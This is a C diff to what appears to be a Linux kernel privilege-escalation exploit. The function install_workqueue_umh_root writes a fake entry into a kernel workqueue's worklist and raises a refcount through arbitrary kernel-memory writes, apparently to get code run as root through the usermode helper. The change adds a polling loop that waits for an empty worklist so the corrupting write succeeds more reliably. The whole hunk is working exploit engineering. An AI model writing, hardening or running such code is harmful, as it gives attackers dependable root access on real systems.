@@ -435,8 +435,28 @@ static int install_workqueue_umh_root(int fd) {
   int refcnt_write = active_write && root_write32_exact(
       fd, pwq + PWQ_REFCNT_OFF, refcnt + 1);
   list_prev_changed = 1;
-  int list_prev_write = refcnt_write && root_write64_exact(
-      fd, worklist + sizeof(uint64_t), fake_entry);
+  /* Wait for a quiet (empty) pool worklist before touching it: on busy
+   * builds the list can receive kernel work between the pre-check and the
+   * write, which fails the exact verify and forces a risky rollback.
+   * Poll up to ~2s for an empty window, then write immediately. */
+  int list_prev_write = 0;
+  if (refcnt_write) {
+    for (int quiet_try = 0; quiet_try < 80; quiet_try++) {
+      uint64_t quiet_next = 0, quiet_prev = 0;
+      if (!root_read64(fd, worklist, &quiet_next) ||
+          !root_read64(fd, worklist + sizeof(uint64_t), &quiet_prev))
+        break;
+      if (quiet_next != worklist || quiet_prev != worklist) {
+        usleep(25000);
+        continue;
+      }
+      list_prev_write = root_write64_exact(
+          fd, worklist + sizeof(uint64_t), fake_entry);
+      if (list_prev_write)
+        break;
+      usleep(25000);
+    }
+  }
   if (!list_prev_write ||
       !root_read64(fd, worklist, &list_next) || list_next != worklist) {
     pr_error("root umh prepublish write failed counters=%d/%d/%d prev=%d next=%016llx\n",
